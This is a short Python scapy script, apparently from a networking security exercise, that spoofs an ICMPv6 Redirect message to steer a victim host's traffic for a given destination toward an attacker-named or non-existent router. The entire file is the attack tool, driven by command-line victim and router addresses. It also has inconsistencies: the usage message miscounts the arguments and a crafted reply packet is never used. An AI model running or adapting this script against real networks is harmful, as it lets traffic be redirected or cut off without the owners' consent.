#!/usr/bin/python

# Jack Cardwell
# February 18, 2018

# redir.py attempts to redirect traffic to a non-existent router

# LIBRARY IMPORTS
from scapy.all import *
from sys import *

def attack():

    # verify the command line arguments
    if len(sys.argv) <4:
        print("Error: Please enter two command line arguments")
        print("Usage: ./redir.py [VICTIM] [DEST] [NEW_ROUTER]")
        exit(2)

    victim = sys.argv[1]
    dest = sys.argv[2]
    newRouter = sys.argv[3]


    # at this point, send a fake echo request packet
    ip = IPv6(dst = victim, src = dest)
    icmpv6 = ICMPv6EchoRequest()

    packet = (ip/icmpv6)
    send(packet)

    # craft the fake response such that we can spoof the redirect
    ipNew = IPv6(src = victim, dst = dest)
    icmpv6New = ICMPv6EchoReply()
    predicted = (ipNew/icmpv6New)

    # create the fake redirect message from the broadcast address as router
    ip2 = IPv6(src = newRouter, dst = victim)
    secondPortion = ICMPv6ND_Redirect(tgt = newRouter, dst = dest)

    # combine the packet
    sp = (ip2 / secondPortion)

    send(sp)

    exit(0)

attack()
